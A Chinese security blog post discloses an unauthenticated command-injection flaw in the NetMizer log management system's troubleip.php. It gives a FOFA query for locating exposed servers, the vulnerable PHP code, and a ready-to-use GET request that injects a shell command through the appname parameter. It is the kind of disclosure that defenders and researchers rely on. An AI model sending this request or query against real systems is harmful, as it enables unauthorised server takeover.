---
title: "NetMizer日志管理系统 troubleip.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-troubleip-appname-rce.html
asset_dir: assets/netmizer日志管理系统-troubleip.php-命令执行漏洞
---

# NetMizer日志管理系统 troubleip.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/22 08:28
* 1044浏览
* [0评论](#comment)
* 14分钟阅读

深入探索

文件大小转换

Web安全课程

网页浏览器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/troubleip.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞扫描服务

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `troubleip.php` 业务实现关键逻辑部分

```
else if($action == 'showtask'){
    if($csv) $arr_proto = getcontentdesc(0);
    else $arr_proto = getcontentdesc();

    $curid = $page;
    $linenum = $limit;

    $cmd_root = "/var/www/cgi-bin/$appname";
    $cmd = $cmd_root." -i ".intval($id)." -p ";

    chdir("/var/www/html/");
    $fp=@popen($cmd, "r");
    $line=fgets($fp,2048);
    if(substr($line, 0, 5)=="Error") {
       @pclose($fp);
       return $line;
    }
```

深入探索

云安全解决方案

SQL注入防护

VPN服务

当 `$action == 'showtask'` 时，`$appname` 直接拼接在 `$cmd_root` > `$cmd` 中带入 `popen` 执行，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

同样的当 `$action == 'addtask'` 时

```
$search_root = "/var/www/$path";
......
$cmd_root = "/var/www/cgi-bin/$appname";
......
$filename = $search_root."/".$now.".cfg";
$fp = fopen($filename, "w");
if($fp) {
    fputs($fp, $str);
    fclose($fp);
    chdir("/var/www/cgi-bin/");
    $cmd = $cmd_root." -i $now > /dev/null &";
    //$cmd = $cmd_root." -t -v -i $now > /tmp/aa1.txt &";
    @exec($cmd);
}
echo '{"success":true}';
```

深入探索

物流软件安全

安全运维咨询

编程语言教程

`$appname` 也是直接拼接进命令执行字符串中用 exec 来执行最终的命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

漏洞扫描服务

```
GET /data/search/troubleip.php?action=showtask&appname=search;id+%23+&id=1 HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 `id` 命令并且回显命令执行结果

[![NetMizer日志管理系统 troubleip.php 命令执行漏洞](images/img-001-d7422b023d89.webp)](https://image.mrxn.net/a35a7ea221fc446e8677fa35b55ad8d0.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 troubleip.php 命令执行漏洞](https://mrxn.net/jswz/netmizer-search-troubleip-appname-rce.html)  
文章链接：<https://mrxn.net/jswz/netmizer-search-troubleip-appname-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-troubleip-appname-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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